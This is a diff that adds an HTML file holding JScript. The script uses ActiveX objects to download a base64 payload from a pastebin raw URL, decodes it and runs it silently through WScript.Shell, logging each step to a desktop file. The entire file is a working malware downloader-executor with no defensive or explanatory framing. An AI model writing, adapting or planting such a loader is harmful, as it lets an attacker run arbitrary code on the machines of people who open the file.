@@ -1,0 +1,76 @@
+<html>
+<script>
+    // Custom Base64 decoding function
+    function atob(base64) {
+        var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+        var str = '';
+        var bytes = [];
+        var buffer = 0, bufferLength = 0;
+
+        for (var i = 0; i < base64.length; i++) {
+            var index = chars.indexOf(base64[i]);
+            if (index === -1) continue;
+            buffer = (buffer << 6) | index;
+            bufferLength += 6;
+
+            while (bufferLength >= 8) {
+                bufferLength -= 8;
+                bytes.push((buffer >> bufferLength) & 0xff);
+            }
+        }
+
+        for (var j = 0; j < bytes.length; j++) {
+            str += String.fromCharCode(bytes[j]);
+        }
+
+        return str;
+    }
+
+    // Fetch the payload from the URL and decode it
+    function log(message) {
+        try {
+            var fso = new ActiveXObject("Scripting.FileSystemObject");
+            var file = fso.OpenTextFile("C:\\Users\\Admin\\Desktop\\debug.log", 8, true);
+            file.WriteLine(new Date() + ": " + message);
+            file.Close();
+        } catch (e) {
+            // Handle logging errors silently
+        }
+    }
+
+    try {
+        log("Starting script execution");
+
+        var url = "https://pastebin.com/raw/eLMFKfhH";
+        var xhr = new ActiveXObject("Microsoft.XMLHTTP");
+        xhr.open("GET", url, false);
+        xhr.send();
+
+        if (xhr.status === 200) {
+            log("Fetched payload successfully");
+            var base64Payload = xhr.responseText;
+
+            log("Decoding payload");
+            var binaryString = atob(base64Payload);
+            var bytes = new Uint8Array(binaryString.length);
+            for (var i = 0; i < binaryString.length; i++) {
+                bytes[i] = binaryString.charCodeAt(i);
+            }
+            var decodedPayload = new TextDecoder("utf-8").decode(bytes);
+
+            log("Decoded payload: " + decodedPayload);
+
+            // Execute payload
+            var shell = new ActiveXObject("WScript.Shell");
+            log("Executing payload");
+            shell.Run(decodedPayload, 0, false);
+
+            log("Execution complete");
+        } else {
+            log("Failed to fetch payload, HTTP status: " + xhr.status);
+        }
+    } catch (e) {
+        log("Error: " + e.message);
+    }
+</script>
+</html>
